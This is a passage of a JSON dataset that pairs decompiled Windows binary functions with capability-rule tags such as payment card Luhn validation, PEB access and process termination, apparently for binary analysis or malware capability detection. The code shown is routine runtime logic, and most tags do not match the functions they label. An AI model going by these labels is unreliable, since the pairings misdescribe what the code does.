            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.140017558(int64_t arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ulong *puVar3;\n    int64_t iVar4;\n    \n    if (arg1 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        puVar3 = (*pcVar1)();\n        return puVar3;\n    }\n    iVar4 = fcn.140006c48();\n    fcn.140016f8c(0);\n    puVar3 = *(iVar4 + 0x30);\n    while( true ) {\n        if (puVar3 == NULL) {\n            fcn.140017020(0);\n            return NULL;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(arg1, *puVar3);\n        if (iVar2 == 0) break;\n        puVar3 = puVar3[4];\n    }\n    fcn.140017020(0);\n    return puVar3;\n}\n",
        "token_count": 227
    },
    "140017df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140017df4(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    uint64_t uVar2;\n    \n    uVar2 = arg2;\n    if (arg2 == 0) {\n        uVar2 = 0x11;\n    }\n    if (*(arg1 + 8) != 0) {\n        fcn.1400058b4(*(arg1 + 8));\n        *(arg1 + 8) = 0;\n    }\n    if (arg3 != 0) {\n        uVar1 = SUB168(ZEXT816(8) * ZEXT816(uVar2), 0);\n        if (SUB168(ZEXT816(8) * ZEXT816(uVar2) >> 0x40, 0) != 0) {\n            uVar1 = 0xffffffffffffffff;\n        }\n        uVar1 = fcn.140005870(uVar1);\n        *(arg1 + 8) = uVar1;\n        fcn.14001bd50(uVar1, 0, uVar2 << 3);\n    }\n    *(arg1 + 0x10) = uVar2;\n    return;\n}\n",
        "token_count": 263
    },
    "1400181e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400181e0(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    \n    for (iVar2 = (*_sym.imp.USER32.dll_GetCapture)(); iVar2 != 0; iVar2 = fcn.14000ccc8(iVar2)) {\n        iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(iVar2, 0x365, 0, 0);\n        if (iVar3 != 0) {\n            return;\n        }\n    }\n    for (iVar2 = (*_sym.imp.USER32.dll_GetFocus)(); iVar2 != 0; iVar2 = fcn.14000ccc8(iVar2)) {\n        iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(iVar2, 0x365, 0, 0);\n        if (iVar3 != 0) {\n            return;\n        }\n    }\n    iVar2 = fcn.14000cd40(arg1);\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.USER32.dll_GetLastActivePopup)(*(iVar2 + 0x40));\n        while( true ) {\n            if (iVar2 == 0) {\n                (*_sym.imp.USER32.dll_SendMessageA)(*(arg1 + 0x40), 0x111, 0xe147, 0);\n                return;\n            }\n            iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(iVar2, 0x365, 0, 0);\n            if (iVar3 != 0) break;\n            iVar2 = fcn.14000ccc8(iVar2);\n        }\n        return;\n    }\n    fcn.140005e30();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 402
    },
    "1400182c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400182c0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    \n    if (*(arg1 + 0xc0) == 0) {\n        fcn.1400181e0(arg1);\n    }\n    else if (*(arg1 + 0xc0) != 0x3f107) {\n        iVar1 = fcn.140006c48();\n        (**(**(iVar1 + 8) + 0x158))(*(iVar1 + 8), *(arg1 + 0xc0), 1);\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "14001832": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * fcn.140018328(int64_t arg1)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    piVar2 = arg1 + 0x1a;\n    if (*(arg1 + 2) != -1) {\n        piVar2 = arg1 + 0x12;\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    do {\n        iVar1 = *piVar2;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 != 0);\n    return piVar2;\n}\n",
        "token_count": 247
    },
    "14001884": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.14001884c(ulong *arg1, int64_t arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    ulong *puVar4;\n    \n    if (arg2 == 0) {\n        *arg1 = 0;\n        *(arg1 + 1) = 0;\n        *(arg1 + 0xc) = 0;\n    }\n    else {\n        uVar2 = fcn.140018380(arg2);\n        iVar3 = fcn.14001848c(arg1, arg2, uVar2);\n        if (iVar3 == 0) {\n            fcn.140005de8();\n            pcVar1 = swi(3);\n            puVar4 = (*pcVar1)();\n            return puVar4;\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 191
    },
    "140018cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140018cc4(ulong *arg1, int64_t arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    ulong *puVar2;\n    \n    if ((arg2 != 0) && (arg3 != 0)) {\n        puVar2 = fcn.140005870(arg2 * arg3 + 8);\n        *puVar2 = *arg1;\n        *arg1 = puVar2;\n        return;\n    }\n    fcn.140005e30();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 134
    },
    "140018d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140018d48(int64_t arg1)\n\n{\n    fcn.140018cfc(*(arg1 + 8));\n    *(arg1 + 8) = 0;\n    *(arg1 + 0x10) = 0;\n    return;\n}\n",
        "token_count": 61
    },
    "140018dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140018dd8(int64_t arg1, uint64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ulong arg1_00;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t arg1_01;\n    \n    if (arg2 < 0) {\n        fcn.140005e30();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (-1 < arg3) {\n        *(arg1 + 0x20) = arg3;\n    }\n    iVar5 = *(arg1 + 8);\n    if (arg2 == 0) {\n        fcn.1400058b4(iVar5);\n        *(arg1 + 8) = 0;\n        *(arg1 + 0x18) = 0;\n        *(arg1 + 0x10) = 0;\n    }\n    else {\n        if (iVar5 == 0) {\n            if (0xffffffff < arg2) {\n                fcn.140005e30();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            arg1_00 = fcn.140005870(arg2);\n            *(arg1 + 8) = arg1_00;\n            fcn.14001bd50(arg1_00, 0, arg2);\n            *(arg1 + 0x18) = arg2;\n        }\n        else {\n            iVar1 = *(arg1 + 0x18);\n            if (iVar1 < arg2) {\n                iVar5 = *(arg1 + 0x20);\n                if (*(arg1 + 0x20) == 0) {\n                    iVar4 = *(arg1 + 0x10) + (*(arg1 + 0x10) >> 0x3f & 7) >> 3;\n                    if (((iVar4 < 4) || (iVar5 = 0x400,  iVar4 < 0x401)) && (iVar5 = iVar4,  iVar4 < 4)) {\n                        iVar5 = 4;\n                    }\n                }\n                arg1_01 = arg2;\n                if (arg2 < iVar5 + iVar1) {\n                    arg1_01 = iVar5 + iVar1;\n                }\n                if (arg1_01 < iVar1) {\n                    fcn.140005e30();\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                iVar5 = fcn.140005870(arg1_01);\n                iVar3 = fcn.14001af18(iVar5, arg1_01, *(arg1 + 8), *(arg1 + 0x10));\n                if (iVar3 != 0) {\n                    if (iVar3 == 0xc) {\n                        fcn.140005de8();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                        fcn.140005e30();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    if (iVar3 != 0x50) {\n                        fcn.140005e30();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                }\n                fcn.14001bd50(*(arg1 + 0x10) + iVar5, 0, arg2 - *(arg1 + 0x10));\n                fcn.1400058b4(*(arg1 + 8));\n                *(arg1 + 8) = iVar5;\n                *(arg1 + 0x18) = arg1_01;\n            }\n            else {\n                iVar1 = *(arg1 + 0x10);\n                if (iVar1 < arg2) {\n                    fcn.14001bd50(iVar5 + iVar1, 0, arg2 - iVar1);\n                }\n            }\n        }\n        *(arg1 + 0x10) = arg2;\n    }\n    return;\n}\n",
        "token_count": 919
    },
    "1400190b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.1400190b4(int64_t arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    ulong uVar4;\n    \n    if (arg1 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        uVar3 = (*pcVar1)();\n        return uVar3;\n    }\n    uVar4 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameA)();\n    if (arg2 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(uVar4);\n        uVar3 = iVar2 + 1;\n    }\n    else {\n        iVar2 = fcn.14001bb58(arg2, arg3, uVar4, 0xffffffffffffffff);\n        if (iVar2 != 0) {\n            if (iVar2 == 0xc) {\n                fcn.140005de8();\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n            if ((iVar2 == 0x16) || (iVar2 == 0x22)) {\n                fcn.140005e30();\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n            if (iVar2 != 0x50) {\n                fcn.140005e30();\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 385
    },
    "1400196a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400196a0(int64_t arg1, int64_t arg2, uint *arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    \n    if ((arg2 < 0) || (arg4 < 1)) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (arg2 < *(arg1 + 0x10)) {\n        iVar2 = *(arg1 + 0x10);\n        fcn.140019474(arg1, arg4 + iVar2, 0xffffffffffffffff);\n        iVar3 = 0;\n        if (0 < arg4) {\n            do {\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < arg4);\n        }\n        iVar2 = (iVar2 - arg2) * 4;\n        iVar3 = fcn.14001afb0(*(arg1 + 8) + (arg2 + arg4) * 4, iVar2, *(arg1 + 8) + arg2 * 4, iVar2);\n        if (iVar3 != 0) {\n            if (iVar3 == 0xc) {\n                fcn.140005de8();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                fcn.140005e30();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            if (iVar3 != 0x50) {\n                fcn.140005e30();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.14001bd50(*(arg1 + 8) + arg2 * 4, 0, arg4 << 2);\n        iVar3 = 0;\n        if (0 < arg4) {\n            do {\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < arg4);\n        }\n    }\n    else {\n        fcn.140019474(arg1, arg2 + arg4, 0xffffffffffffffff);\n    }\n    arg2 = arg2 << 2;\n    do {\n        *(arg2 + *(arg1 + 8)) = *arg3;\n        arg2 = arg2 + 4;\n        arg4 = arg4 + -1;\n    } while (arg4 != 0);\n    return;\n}\n",
        "token_count": 571
    },
    "1400198f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400198f0(int64_t arg1, ulong *arg2)\n\n{\n    code **ppcVar1;\n    int32_t iVar2;\n    int64_t arg1_00;\n    ulong *puVar3;\n    code **ppcStackX24;\n    code **ppcStackX32;\n    \n    arg1_00 = *(arg1 + 0x60);\n    ppcStackX24 = NULL;\n    if (arg1_00 == 0) {\n        ppcStackX32 = fcn.140005870(0x38);\n        if (ppcStackX32 == NULL) {\n            arg1_00 = 0;\n        }\n        else {\n            arg1_00 = fcn.140015ad8(ppcStackX32, 10);\n        }\n    }\n    iVar2 = fcn.14001598c(arg1_00, 1, &ppcStackX24);\n    if (iVar2 == 0) {\n        ppcStackX32 = fcn.140005870(0x28);\n        if (ppcStackX32 == NULL) {\n            ppcStackX32 = NULL;\n        }\n        else {\n            *ppcStackX32 = \n            vtable.CArray_enum_CArchive::LoadArrayObjType__enum_CArchive::LoadArrayObjType_const____ptr64_.0;\n            ppcStackX32[1] = NULL;\n            ppcStackX32[4] = NULL;\n            ppcStackX32[3] = NULL;\n            ppcStackX32[2] = NULL;\n        }\n        ppcVar1 = ppcStackX32;\n        fcn.140019474(ppcStackX32, 1, *(arg1 + 0x68));\n        puVar3 = fcn.140015b8c(arg1_00, 1);\n        *puVar3 = ppcVar1;\n        ppcStackX24 = ppcVar1;\n    }\n    *(arg1 + 0x60) = arg1_00;\n    if (arg2 != NULL) {\n        *arg2 = ppcStackX24;\n    }\n    return;\n}\n",
        "token_count": 471
    },
    "14001a57": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001a574(int64_t arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ulong arg1_00;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    if (arg2 < 0) {\n        fcn.140005e30();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (-1 < arg3) {\n        *(arg1 + 0x20) = arg3;\n    }\n    iVar5 = *(arg1 + 8);\n    if (arg2 == 0) {\n        fcn.1400058b4(iVar5);\n        *(arg1 + 8) = 0;\n        *(arg1 + 0x18) = 0;\n        *(arg1 + 0x10) = 0;\n    }\n    else {\n        if (iVar5 == 0) {\n            arg1_00 = fcn.140005870(arg2 << 3);\n            *(arg1 + 8) = arg1_00;\n            fcn.14001bd50(arg1_00, 0, arg2 << 3);\n            *(arg1 + 0x18) = arg2;\n        }\n        else {\n            iVar1 = *(arg1 + 0x18);\n            if (iVar1 < arg2) {\n                iVar5 = *(arg1 + 0x20);\n                if (*(arg1 + 0x20) == 0) {\n                    iVar4 = *(arg1 + 0x10) + (*(arg1 + 0x10) >> 0x3f & 7) >> 3;\n                    if (((iVar4 < 4) || (iVar5 = 0x400,  iVar4 < 0x401)) && (iVar5 = iVar4,  iVar4 < 4)) {\n                        iVar5 = 4;\n                    }\n                }\n                iVar4 = arg2;\n                if (arg2 < iVar5 + iVar1) {\n                    iVar4 = iVar5 + iVar1;\n                }\n                if (iVar4 < iVar1) {\n                    fcn.140005e30();\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                iVar5 = fcn.140005870(iVar4 << 3);\n                iVar3 = fcn.14001af18(iVar5, iVar4 << 3, *(arg1 + 8), *(arg1 + 0x10) << 3);\n                if (iVar3 != 0) {\n                    if (iVar3 == 0xc) {\n                        fcn.140005de8();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                        fcn.140005e30();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    if (iVar3 != 0x50) {\n                        fcn.140005e30();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                }\n                fcn.14001bd50(iVar5 + *(arg1 + 0x10) * 8, 0, (arg2 - *(arg1 + 0x10)) * 8);\n                fcn.1400058b4(*(arg1 + 8));\n                *(arg1 + 8) = iVar5;\n                *(arg1 + 0x18) = iVar4;\n            }\n            else {\n                iVar1 = *(arg1 + 0x10);\n                if (iVar1 < arg2) {\n                    fcn.14001bd50(iVar5 + iVar1 * 8, 0, (arg2 - iVar1) * 8);\n                }\n            }\n        }\n        *(arg1 + 0x10) = arg2;\n    }\n    return;\n}\n",
        "token_count": 892
    },
    "14001a71": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001a718(int64_t arg1, int64_t arg2, ulong arg3, int64_t arg4)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    \n    if ((arg2 < 0) || (arg4 < 1)) {\n        fcn.140005e30();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (arg2 < *(arg1 + 0x10)) {\n        iVar1 = *(arg1 + 0x10);\n        fcn.14001a574(arg1, iVar1 + arg4, 0xffffffffffffffff);\n        iVar3 = fcn.14001afb0(*(arg1 + 8) + (arg2 + arg4) * 8, ((*(arg1 + 0x10) - arg2) - arg4) * 8, \n                              *(arg1 + 8) + arg2 * 8, (iVar1 - arg2) * 8);\n        if (iVar3 != 0) {\n            if (iVar3 == 0xc) {\n                fcn.140005de8();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                fcn.140005e30();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if (iVar3 != 0x50) {\n                fcn.140005e30();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.14001bd50(*(arg1 + 8) + arg2 * 8, 0, arg4 << 3);\n    }\n    else {\n        fcn.14001a574(arg1, arg2 + arg4, 0xffffffffffffffff);\n    }\n    arg2 = arg2 << 3;\n    do {\n        *(arg2 + *(arg1 + 8)) = arg3;\n        arg2 = arg2 + 8;\n        arg4 = arg4 + -1;\n    } while (arg4 != 0);\n    return;\n}\n",
        "token_count": 502
    },
    "14001b07": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14001b070(int64_t arg1, ulong arg2)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    ulong uStack56;\n    uint uStack48;\n    ulong uStack40;\n    uint uStack32;\n    \n    if (arg1 == 0) {\n        puVar1 = fcn.14001bc68();\n        *puVar1 = 0x16;\n        fcn.14001ed34(0, 0, 0, 0);\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uStack40 = 0;\n        uStack56 = 0;\n        uStack48 = 0x7fffffff;\n        uStack32 = 0x42;\n        uVar2 = (*0x14001f020)(&uStack56);\n    }\n    return uVar2;\n}\n",
        "token_count": 190
    },
    "14001d2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.14001d2c0(int64_t arg1, int64_t arg2, int64_t arg3)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    \n    if (arg1 == 0) {\n        fcn.14001ebc4();\n    }\n    uVar1 = *(arg1 + 0x14);\n    if (*(arg1 + 0x18) + *(arg2 + 8) == 0) {\n        fcn.14001ebc4();\n    }\n    uVar3 = 0;\n    if (uVar1 != 0) {\n        iVar2 = *(arg2 + 8);\n        piVar4 = iVar2 + *(arg1 + 0x18);\n        do {\n            if (arg3 < *piVar4 + iVar2) break;\n            uVar3 = uVar3 + 1;\n            piVar4 = piVar4 + 2;\n        } while (uVar3 < uVar1);\n        if (uVar3 != 0) {\n            return *(*(arg1 + 0x18) + (uVar3 - 1) * 8 + 4 + iVar2);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 290
    },
    "14002274": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140022744(void)\n\n{\n    code **ppcVar1;\n    \n    for (ppcVar1 = 0x140037040; ppcVar1 < 0x140037040; ppcVar1 = ppcVar1 + 1) {\n        if (*ppcVar1 != NULL) {\n            (**ppcVar1)();\n        }\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "14002a18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14002a184(ulong lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)();\n    return 0;\n}\n",
        "token_count": 34
    },
    "14002a1e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.14002a1e0(uint *arg1)\n\n{\n    int32_t iVar1;\n    \n    fcn.14001bd50(arg1 + 10, 0, 0x28);\n    *(arg1 + 0x14) = 0;\n    arg1[0x16] = 0;\n    arg1[0x17] = 0;\n    *(arg1 + 4) = 0x140000000;\n    *(arg1 + 2) = 0x140000000;\n    *arg1 = 0x60;\n    arg1[6] = 0x900;\n    *(arg1 + 8) = 0x140034cb8;\n    iVar1 = fcn.14002a184(arg1 + 10);\n    if (iVar1 < 0) {\n        *0x14003fc88 = 1;\n    }\n    return arg1;\n}\n",
        "token_count": 204
    },
    "14001b57": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.14001b57c(ulong param_1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.14001b474(param_1);\n    return (iVar1 != 0) - 1;\n}\n",
        "token_count": 56
    },
    "140002f0": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nulong fcn.140002f00(void)\n\n{\n    int64_t in_GS_OFFSET;\n    \n    return *(in_GS_OFFSET + 0x60);\n}\n",
        "token_count": 36
    },
    "1400058b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint64_t fcn.1400058bc(ulong arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    \n    while( true ) {\n        iVar2 = fcn.14001b99c(arg1);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        if (*0x14003d2c8 == NULL) break;\n        iVar1 = (**0x14003d2c8)(arg1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 128
    },
    "14001590": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong * fcn.14001590c(int64_t arg1, uint64_t arg2, uint *arg3, uint *arg4)\n\n{\n    uint64_t uVar1;\n    ulong *puVar2;\n    \n    *arg4 = arg2 >> 4;\n    uVar1 = (arg2 >> 4 & 0xffffffff) % *(arg1 + 0x10);\n    *arg3 = uVar1;\n    if (*(arg1 + 8) != 0) {\n        for (puVar2 = *(*(arg1 + 8) + uVar1 * 8); puVar2 != NULL; puVar2 = *puVar2) {\n            if (puVar2[1] == arg2) {\n                return puVar2;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 179
    },
    "1400180f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.1400180f0(code **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    ulong *puVar7;\n    \n    *arg1 = vtable.CMapStringToPtr.0;\n    if (arg1[1] != NULL) {\n        uVar6 = 0;\n        if (*(arg1 + 2) != 0) {\n            iVar5 = 0;\n            do {\n                for (puVar7 = *(arg1[1] + iVar5); puVar7 != NULL; puVar7 = *puVar7) {\n                    if (puVar7 + 2 == NULL) {\n                        fcn.140005e30();\n                        pcVar4 = swi(3);\n                        (*pcVar4)();\n                        return;\n                    }\n                    iVar3 = puVar7[2];\n                    LOCK();\n                    piVar1 = iVar3 + -8;\n                    iVar2 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                    if (iVar2 + -1 < 1) {\n                        (**(**(iVar3 + -0x18) + 8))();\n                    }\n                }\n                uVar6 = uVar6 + 1;\n                iVar5 = iVar5 + 8;\n            } while (uVar6 < *(arg1 + 2));\n        }\n        fcn.1400058b4(arg1[1]);\n        arg1[1] = NULL;\n    }\n    arg1[3] = NULL;\n    arg1[4] = NULL;\n    fcn.140018cfc(arg1[5]);\n    arg1[5] = NULL;\n    return;\n}\n",
        "token_count": 393
    },
    "14001cb3": {
        "rules": [
            "contain loop",
            "terminate process"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014001cad5)\n// WARNING: Removing unreachable block (ram,0x00014001c9ed)\n// WARNING: Removing unreachable block (ram,0x00014001ca0a)\n// WARNING: Removing unreachable block (ram,0x00014001ca2e)\n// WARNING: Removing unreachable block (ram,0x00014001ca3c)\n// WARNING: Removing unreachable block (ram,0x00014001ca46)\n// WARNING: Removing unreachable block (ram,0x00014001ca48)\n// WARNING: Removing unreachable block (ram,0x00014001ca4d)\n// WARNING: Removing unreachable block (ram,0x00014001ca82)\n// WARNING: Removing unreachable block (ram,0x00014001ca87)\n// WARNING: Removing unreachable block (ram,0x00014001caa7)\n// WARNING: Removing unreachable block (ram,0x00014001caa9)\n// WARNING: Removing unreachable block (ram,0x00014001cb0a)\n\nvoid fcn.14001cb30(ulong arg1)\n\n{\n    code *pcVar1;\n    \n    fcn.140023ba4(8);\n    if (*0x140053820 != 1) {\n        *0x14005381c = 1;\n        *0x140053818 = 0;\n        fcn.14001c878(0x14002da98, 0x14002daa0);\n    }\n    *0x140053820 = 1;\n    fcn.140023aa4(8);\n    fcn.14001c80c(arg1);\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(arg1);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 394
    },
    "14001d34": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.14001d34c(int64_t arg1, int64_t *arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    \n    iVar3 = *arg2;\n    if (arg1 == 0) {\n        fcn.14001ebc4();\n    }\n    uVar1 = *(arg1 + 0x14);\n    if (*(arg1 + 0x18) + arg2[1] == 0) {\n        fcn.14001ebc4();\n    }\n    uVar4 = 0;\n    if (uVar1 != 0) {\n        iVar2 = arg2[1];\n        piVar5 = iVar2 + *(arg1 + 0x18);\n        do {\n            if (iVar3 < *piVar5 + iVar2) break;\n            uVar4 = uVar4 + 1;\n            piVar5 = piVar5 + 2;\n        } while (uVar4 < uVar1);\n        if (uVar4 != 0) {\n            return *(*(arg1 + 0x18) + (uVar4 - 1) * 8 + 4 + iVar2);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 295
    },
    "14001653": {
        "rules": [
            "get graphical window text"
        ],
